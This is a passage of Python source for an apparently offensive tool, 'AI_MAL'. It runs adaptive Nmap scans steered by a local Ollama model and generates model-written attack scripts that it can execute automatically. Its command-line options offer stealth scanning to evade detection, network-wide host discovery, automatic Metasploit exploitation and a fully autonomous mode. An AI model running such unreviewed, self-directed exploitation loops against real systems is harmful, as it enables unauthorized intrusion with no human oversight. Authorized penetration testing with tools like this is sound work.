                        "version": port_data.get('version', '')
                    }
        
        # Collect UDP ports
        if 'udp' in host_data:
            for port, port_data in host_data['udp'].items():
                if port_data['state'] == 'open':
                    summary['open_ports'][f"{port}/udp"] = {
                        "service": port_data.get('name', 'unknown'),
                        "product": port_data.get('product', ''),
                        "version": port_data.get('version', '')
                    }
        
        return summary

    def prepare_ollama_context(self):
        """Prepare context from scan history for Ollama."""
        if not self.scan_history:
            return "No previous scan data available."
        
        context = []
        for i, scan in enumerate(self.scan_history[-3:]):  # Use at most the last 3 scans
            params = scan.get('params', [])
            summary = scan.get('result_summary', {})
            
            context.append(f"Scan {i+1}: Parameters: {' '.join(params)}")
            
            if isinstance(summary, dict) and 'open_ports' in summary:
                ports_info = []
                for port_key, port_data in summary['open_ports'].items():
                    service_version = f"{port_data['service']} {port_data['product']} {port_data['version']}".strip()
                    ports_info.append(f"{port_key}: {service_version}")
                
                if ports_info:
                    context.append(f"Results: Found {len(ports_info)} open ports:")
                    context.extend([f"  - {info}" for info in ports_info])
                else:
                    context.append("Results: No open ports found")
            else:
                context.append(f"Results: {summary}")
        
        return "\n".join(context)

    def query_ollama(self, prompt):
        """Query Ollama for next scan strategy."""
        try:
            url = "http://localhost:11434/api/generate"
            data = {
                "model": self.ollama_model,
                "prompt": prompt,
                "stream": False
            }
            
            response = requests.post(url, json=data)
            
            if response.status_code == 200:
                result = response.json()
                return result.get('response', '')
            else:
                logger.error(f"Ollama API error: {response.status_code} - {response.text}")
                return None
        except Exception as e:
            logger.error(f"Error querying Ollama: {str(e)}")
            return None

    def parse_ollama_response(self, response):
        """Parse Ollama response to extract Nmap parameters."""
        if not response:
            return []
        
        # Clean up the response
        lines = response.strip().split('\n')
        
        # Look for lines that start with nmap or -
        for line in lines:
            line = line.strip()
            if line.startswith('nmap '):
                # Remove 'nmap ' prefix and split into parameters
                return line[5:].split()
            elif line.startswith('-') and ' ' in line:
                # This looks like Nmap parameters, split it
                return line.split()
        
        # Fallback: just return all non-empty lines joined and split by spaces
        all_text = ' '.join([l.strip() for l in lines if l.strip()])
        return all_text.split()

    def get_open_ports_from_history(self):
        """Get a comma-separated list of open ports from scan history."""
        if not self.scan_history:
            return ""
        
        open_ports = set()
        
        for scan in self.scan_history:
            summary = scan.get('result_summary', {})
            if isinstance(summary, dict) and 'open_ports' in summary:
                for port_key in summary['open_ports'].keys():
                    port = port_key.split('/')[0]  # Extract port number from "port/protocol"
                    open_ports.add(port)
        
        return ','.join(sorted(open_ports, key=int)) if open_ports else ""

    def generate_custom_script(self, script_type="bash", target_info=None):
        """Generate a custom script using Ollama based on scan results."""
        if not self.custom_scripts:
            return None
            
        if not target_info:
            # Use the current target and latest scan results if no specific target info provided
            if not self.scan_history:
                logger.warning("No scan history available for script generation")
                return None
                
            target_info = {
                "target": self.target,
                "scan_history": self.scan_history[-3:] if len(self.scan_history) > 3 else self.scan_history,
                "discovered_services": {k: v for k, v in self.discovered_services.items() if k.split('/')[1] in ['tcp', 'udp']}
            }
        
        script_types = {
            "bash": {
                "extension": "sh",
                "shebang": "#!/bin/bash",
                "comment_prefix": "#"
            },
            "python": {
                "extension": "py",
                "shebang": "#!/usr/bin/env python3",
                "comment_prefix": "#"
            },
            "ruby": {
                "extension": "rb",
                "shebang": "#!/usr/bin/env ruby",
                "comment_prefix": "#"
            }
        }
        
        if script_type not in script_types:
            logger.error(f"Unsupported script type: {script_type}")
            return None
            
        script_config = script_types[script_type]
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        script_name = f"ai_script_{script_type}_{timestamp}.{script_config['extension']}"
        script_path = os.path.join(self.generated_scripts_dir, script_name)
        
        # Prepare context for Ollama with target info
        context = self.prepare_script_context(target_info)
        
        # Define the prompt for Ollama
        prompt = f"""As an advanced cybersecurity tool, write a {script_type} script that performs further analysis on target {target_info['target']} based on the scan information below. 

The script should be focused, practical, and effective for cybersecurity analysis.

{context}

Important requirements:
1. Create a complete, executable {script_type} script
2. Include proper error handling and verbose output
3. The script must start with {script_config['shebang']}
4. Include detailed comments explaining what each section does
5. Focus on security testing relevant to the discovered services
6. Do not attempt to damage or permanently alter the target system
7. Include proper command-line argument parsing
8. Provide a usage/help section with -h flag

Respond ONLY with the script code and nothing else. No introduction or explanation needed.
"""

        # Get response from Ollama
        logger.info(f"Generating {script_type} script using Ollama model {self.ollama_model}...")
        response = self.query_ollama(prompt)
        
        if not response:
            logger.error("Failed to get response from Ollama for script generation")
            return None
            
        # Extract the script content from the Ollama response
        script_content = self.extract_code_from_response(response, script_type)
        
        if not script_content:
            logger.error("Failed to extract valid script content from Ollama response")
            return None
            
        # Ensure script has proper shebang
        if not script_content.startswith(script_config['shebang']):
            script_content = f"{script_config['shebang']}\n\n{script_content}"
            
        # Add header
        header = f"""
{script_config['comment_prefix']} AI-Generated Script for Target: {target_info['target']}
{script_config['comment_prefix']} Generated on: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
{script_config['comment_prefix']} Generated by: AI_MAL using {self.ollama_model}
{script_config['comment_prefix']} 
{script_config['comment_prefix']} IMPORTANT: This script is generated for legitimate security testing only.
{script_config['comment_prefix']} Always ensure you have proper authorization before running.
{script_config['comment_prefix']}
"""
        script_content = header + script_content
        
        # Write script to file
        try:
            with open(script_path, 'w') as f:
                f.write(script_content)
                
            # Make executable
            os.chmod(script_path, os.stat(script_path).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
            
            logger.info(f"Generated {script_type} script: {script_path}")
            self.ai_generated_scripts.append(script_path)
            return script_path
            
        except Exception as e:
            logger.error(f"Error writing script to file: {str(e)}")
            logger.debug(traceback.format_exc())
            return None
    
    def prepare_script_context(self, target_info):
        """Prepare contextual information for script generation."""
        context = []
        
        # Target information
        context.append(f"Target: {target_info['target']}")
        
        # Scan history summary
        if 'scan_history' in target_info and target_info['scan_history']:
            context.append("\nScan History:")
            for i, scan in enumerate(target_info['scan_history']):
                # Extract key information from scan
                if isinstance(scan, dict):
                    scan_params = scan.get('params', [])
                    result_summary = scan.get('result_summary', {})
                    
                    if scan_params:
                        context.append(f"  Scan {i+1} Parameters: {' '.join(scan_params)}")
                    
                    if isinstance(result_summary, dict) and 'open_ports' in result_summary:
                        open_ports = result_summary['open_ports']
                        if open_ports:
                            context.append(f"  Open ports found:")
                            for port_key, port_data in open_ports.items():
                                service_info = f"{port_data.get('service', 'unknown')} {port_data.get('product', '')} {port_data.get('version', '')}".strip()
                                context.append(f"    - {port_key}: {service_info}")
        
        # Discovered services
        if 'discovered_services' in target_info and target_info['discovered_services']:
            context.append("\nDiscovered Services:")
            for port_key, service_info in target_info['discovered_services'].items():
                service = service_info.get('service', 'unknown')
                product = service_info.get('product', '')
                version = service_info.get('version', '')
                service_str = f"{service} {product} {version}".strip()
                context.append(f"  - {port_key}: {service_str}")
        
        return "\n".join(context)
    
    def extract_code_from_response(self, response, script_type):
        """Extract code block from Ollama response."""
        # Look for code blocks with backticks
        code_block_pattern = r"```(?:\w+)?\s*([\s\S]*?)```"
        code_blocks = re.findall(code_block_pattern, response)
        
        if code_blocks:
            # Return the longest code block (most likely the complete script)
            return max(code_blocks, key=len).strip()
        
        # If no code blocks with backticks, try to extract the entire response
        # Remove any markdown or explanatory text at the beginning or end
        lines = response.split('\n')
        
        # Extensions for each script type
        extensions = {
            "bash": [".sh", "bash", "shell"],
            "python": [".py", "python"],
            "ruby": [".rb", "ruby"]
        }
        
        # Try to find where the code starts (after explanatory text)
        start_idx = 0
        for i, line in enumerate(lines):
            # Look for shebang
            if line.startswith("#!/"):
                start_idx = i
                break
                
            # Look for language indicators
            for ext in extensions.get(script_type, []):
                if ext in line.lower() and i < len(lines) - 1:
                    start_idx = i + 1
                    break
        
        # Try to find where the code ends (before closing remarks)
        end_idx = len(lines)
        closing_remarks = ["hope this helps", "this script will", "let me know", "please note"]
        for i in range(len(lines) - 1, start_idx, -1):
            line = lines[i].lower()
            if any(remark in line for remark in closing_remarks):
                end_idx = i
                break
        
        return "\n".join(lines[start_idx:end_idx]).strip()
    
    def execute_generated_script(self, script_path, args=None):
        """Execute a generated script."""
        if not os.path.exists(script_path):
            logger.error(f"Script not found: {script_path}")
            return False
            
        logger.info(f"Executing generated script: {script_path}")
        
        cmd = [script_path]
        if args:
            cmd.extend(args)
            
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Process output in real-time
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    logger.info(f"Script output: {output.strip()}")
                    
            # Get any remaining output
            remaining_output, errors = process.communicate()
            if remaining_output:
                logger.info(f"Script output: {remaining_output.strip()}")
            if errors:
                logger.warning(f"Script errors: {errors.strip()}")
                
            if process.returncode != 0:
                logger.warning(f"Script exited with non-zero status: {process.returncode}")
                return False
                
            logger.info(f"Script execution completed successfully")
            return True
            
        except Exception as e:
            logger.error(f"Error executing script: {str(e)}")
            logger.debug(traceback.format_exc())
            return False

def main():
    parser = argparse.ArgumentParser(description="Adaptive Nmap scanner with Ollama and Metasploit integration")
    # Optional target
    parser.add_argument("target", nargs="?", help="Target IP address or hostname (optional if --auto-discover is used)")
    parser.add_argument("--model", default="qwen2.5-coder:7b",
                        help="Ollama model to use (default: qwen2.5-coder:7b, alternatives: llama3)")
    parser.add_argument("--iterations", type=int, default=3, help="Maximum number of scan iterations (default: 3)")
    parser.add_argument("--continuous", action="store_true", help="Run in continuous mode until manually stopped")
    parser.add_argument("--delay", type=int, default=2, help="Delay in seconds between scans (default: 2)")
    parser.add_argument("--msf", action="store_true", help="Enable Metasploit integration")
    parser.add_argument("--exploit", action="store_true", help="Automatically attempt exploitation using Metasploit")
    parser.add_argument("--workspace", default="adaptive_scan", help="Metasploit workspace name (default: adaptive_scan)")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode for scans to avoid detection")
    parser.add_argument("--auto-script", action="store_true", help="Auto-generate and run Metasploit resource scripts")
    parser.add_argument("--full-auto", action="store_true", help="Full autonomous mode (implies --continuous --msf --exploit --auto-script)")
    parser.add_argument("--quiet", action="store_true", help="Reduce verbosity of output")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    
    # Network discovery options
    parser.add_argument("--auto-discover", action="store_true", help="Automatically discover network and hosts")
    parser.add_argument("--interface", help="Network interface to use for discovery")
    parser.add_argument("--scan-all", action="store_true", help="Scan all discovered hosts (implies --auto-discover)")
    parser.add_argument("--network", help="Specific network to scan in CIDR notation (e.g., 192.168.1.0/24)")
    parser.add_argument("--host-timeout", type=int, default=1, help="Timeout in seconds for host discovery (default: 1)")
    
    # Script generation options
    parser.add_argument("--custom-scripts", action="store_true", help="Enable AI-powered custom script generation")
    parser.add_argument("--script-type", choices=["bash", "python", "ruby"], default="bash", 
                        help="Type of custom script to generate (default: bash)")
    parser.add_argument("--execute-scripts", action="store_true", 
                        help="Automatically execute generated scripts (use with caution)")
    
    # Version information
    parser.add_argument("--version", action="store_true", help="Show version information and exit")
    
    args = parser.parse_args()
    
    # Display version if requested
    if args.version:
        print("AI_MAL Adaptive Nmap Scanner version 1.0.0")
        print("Copyright (c) 2024")
        sys.exit(0)
    
    # Set logging level
    if args.debug:
        logger.setLevel(logging.DEBUG)
    elif args.quiet:
        logger.setLevel(logging.WARNING)
    
    # Full auto mode implications
    if args.full_auto:
        args.continuous = True
        args.msf = True
        args.exploit = True
        args.auto_script = True
        args.custom_scripts = True
    
    # Network discovery implications
    if args.scan_all:
        args.auto_discover = True
    
    # Check if we have a target or auto-discover
    if not args.target and not args.auto_discover:
        logger.error("Error: Either a target must be specified or --auto-discover must be enabled")
        parser.print_help()
        sys.exit(1)
    
    # Initialize scanner with appropriate options
    scanner = AdaptiveNmapScanner(
        target=args.target,
        ollama_model=args.model,
        max_iterations=args.iterations,
        continuous=args.continuous,
        delay=args.delay,
        enable_msf=args.msf,
        auto_exploit=args.exploit,
        msf_workspace=args.workspace,
        stealth_mode=args.stealth,
        auto_script=args.auto_script,
        full_auto=args.full_auto,
        auto_discover=args.auto_discover,
        interface=args.interface,
        custom_scripts=args.custom_scripts,
        execute_scripts=args.execute_scripts
    )
    
    # Additional setup for network option
    if args.network and scanner.network_discovery:
        scanner.network_discovery.network = args.network
        logger.info(f"Using specified network: {args.network}")
    
    # Start scanning
    scanner.run()

if __name__ == "__main__":
    main() 